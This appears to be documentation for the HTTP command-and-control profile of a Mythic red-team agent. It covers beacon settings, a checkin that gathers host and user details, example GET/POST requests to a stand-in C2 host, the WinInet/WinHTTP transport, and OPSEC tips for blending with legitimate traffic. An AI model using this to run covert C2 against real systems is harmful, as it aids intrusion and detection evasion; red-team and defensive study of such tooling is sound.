+++
title = "HTTP"
chapter = false
weight = 5
+++

## Summary

Standard HTTP/HTTPS callback profile with selectable HTTP library (WinInet or WinHTTP).

## Configuration Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| Callback Host | String | - | C2 server hostname or IP (e.g., `https://c2.example.com`) |
| Callback Port | Integer | 80 | C2 server port |
| Callback Interval | Integer | 10 | Beacon interval in seconds |
| Callback Jitter | Integer | 23 | Jitter percentage (0-100) |
| Kill Date | Date | - | Agent self-termination date |
| User Agent | String | Mozilla/5.0... | HTTP User-Agent header |
| GET URI | String | /api/v1/query | URI for GET requests (tasking retrieval) |
| POST URI | String | /api/v1/data | URI for POST requests (task responses) |
| Query Parameter | String | q | Query parameter name for GET requests |
| HTTP Library | ChooseOne | wininet | HTTP library to use: `wininet` or `winhttp` |

## Message Flow

### Checkin (Initial Registration)

The agent sends a JSON checkin payload via POST containing host information, username, PID, architecture, domain, integrity level, external IP, process name, and OS details. Mythic responds with a UUID for all subsequent communication.

### Tasking Retrieval (GET)

```
GET /api/v1/query?q=<base64(UUID + AES(TLV))> HTTP/1.1
Host: c2.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
```

### Task Response (POST)

```
POST /api/v1/data HTTP/1.1
Host: c2.example.com
Content-Type: application/octet-stream

<base64(UUID + AES(TLV))>
```

## Transport Implementation

The HTTP library is selected at build time via the `http_library` build parameter. Both implementations share the same message format and C2 profile configuration.

### WinInet (`USE_WININET` - default)

- Uses `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA` for all HTTP operations
- Response data is read in a 4096-byte loop via `InternetReadFile`
- TLS enabled when callback host starts with `https://` - sets `INTERNET_FLAG_SECURE` and `SECURITY_FLAG_IGNORE_ALL` for self-signed certificates
- Uses ANSI API variants throughout

### WinHTTP (`USE_WINHTTP`)

- Uses `WinHttpOpen`, `WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpSendRequest`, `WinHttpReceiveResponse` for all HTTP operations
- Response data is read via `WinHttpQueryDataAvailable` + `WinHttpReadData` loop
- TLS enabled via `WINHTTP_FLAG_SECURE` with security flags to accept self-signed certificates
- Uses wide-character API variants - host, path, and User-Agent are converted from ANSI to wide via `MultiByteToWideChar`

### Common

- All messages are base64-encoded with the callback UUID prepended before encryption
- Internal message format uses binary TLV (Type-Length-Value) encoding
- Mythic handles server-side AES256 decryption (`mythic_encrypts=True`)

## OPSEC Notes

- **WinInet** is the standard Windows internet library used by Internet Explorer and many Windows applications - blends with legitimate browser traffic. Loaded from `wininet.dll`.
- **WinHTTP** is the HTTP client library used by Windows services and background processes (Windows Update, BITS) - may blend better when the agent runs as a service or from a non-interactive context. Loaded from `winhttp.dll`.
- User-Agent should match target environment browsers or expected service behavior
- GET URI and POST URI should mimic legitimate API patterns
- Consider using HTTPS with a valid certificate on the C2 redirector
- Both libraries accept self-signed certificates when HTTPS is enabled - detectable by TLS inspection appliances
